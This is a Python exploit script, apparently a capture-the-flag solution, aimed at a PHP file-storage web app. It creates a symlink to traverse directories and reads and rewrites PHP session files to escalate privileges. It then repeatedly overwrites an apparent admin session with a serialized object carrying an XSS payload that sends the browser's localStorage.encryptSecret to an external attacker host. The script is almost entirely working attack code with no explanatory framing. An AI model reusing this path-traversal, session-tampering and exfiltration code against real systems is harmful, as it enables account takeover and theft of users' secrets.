from client import *
import string
import random
import sys

def random_string(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

if not api_login('dookerman', 'dookerman'):
    api_register('dookerman', 'dookerman')
    api_create_file('flag.txt', 'hacks')
    api_create_symlink('lol', '../../../../../../')

SESSION = session.cookies.get_dict()['PHPSESSID']

print "SESSION ", SESSION

current_session_deets = api_get_file('lol/tmp/sess_{}'.format(SESSION))

current_session_deets = current_session_deets.replace("""privs";s:1:"3""", """privs";s:2:"15""")

api_create_file('lol/tmp/sess_{}'.format(SESSION), current_session_deets)


deets = api_list_files('lol/tmp')['data']
deets = [X for X in deets if 'sess_' in X and 'sess_sess' not in X]

print len(deets)

# for each in deets:
    # print "Doing ->", each
    # api_create_file('lol/tmp/{}'.format(each), """current_user|O:4:"User":4:{s:8:"username";s:104:"<script>document.location = 'http://hax.perfect.blue/?leek='+ btoa(localStorage.encryptSecret);</script>";s:8:"password";s:60:"$2y$10$2qeN1gE3E8VhV2ZcdLiKM.7JBC3tCVYQh5QW7L1G1Oj2HlX6v8LPG";s:5:"privs";i:15;s:2:"id";s:1:"1";}""")
    # print api_get_file('lol/tmp/{}'.format(each))

# for each in deets:
    # print each
#     print api_get_file('lol/tmp/{}'.format(each))

#I did advanced AI stuff to deduce the admin session and overwrote with XSS payload
while True:
    print api_update_file('lol/tmp/sess_4umud1lupqn0mpibor27r283o1', """current_user|O:4:"User":4:{s:8:"username";s:109:"<script>document.location = 'http://hax.perfect.blue:6969/?leek='+ btoa(localStorage.encryptSecret);</script>";s:8:"password";s:60:"$2y$10$2qeN1gE3E8VhV2ZcdLiKM.7JBC3tCVYQh5QW7L1G1Oj2HlX6v8LPG";s:5:"privs";i:15;s:2:"id";s:1:"1";}""")
    print api_get_file('lol/tmp/sess_4umud1lupqn0mpibor27r283o1')

